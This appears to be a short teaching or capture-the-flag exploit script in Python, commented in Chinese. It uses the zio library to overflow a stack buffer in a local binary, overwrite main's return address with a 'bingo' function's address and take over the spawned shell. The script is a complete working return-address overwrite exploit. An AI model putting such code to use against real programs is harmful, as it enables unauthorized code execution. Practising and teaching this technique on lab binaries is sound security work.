# encoding: utf-8

from zio import *

# 打开本地文件
io = zio("./a.out")
# 构造 payload
"""
l64 函数将 16 进制数转换为 64位机器的内存地址
我们知道 64 位机的机器字长为 8 个字节，因此需要用 8 个字节来填充
16位机器的机器字长位 2 个字节，因此需要用两个字节来填充
其实 l64(0x40060d) 函数就返回字符串："\x0d\x06\x40\x00\x00\x00\x00\x00"
我们亦可以直接手动写成上述字符串格式
"""
payload = (0x7fffffffe428 - 0x7fffffffe3f0) * 'A'  # 将栈上 buffer 首地址所在位置和 main 函数返回地址所在位置之间的所有数据都填充成垃圾数据
payload = payload + l64(0x40060d)  # 将 main 函数的返回地址覆盖为 bingo 的地址
# 写入数据
io.write(payload)
"""
写入数据之后，执行了 bingo 函数，拿到了 shell，这个时候我们要接管对程序的输入输出
调用 interact() 函数释放脚本对程序的控制
"""
# 释放脚本对程序的控制
io.interact()

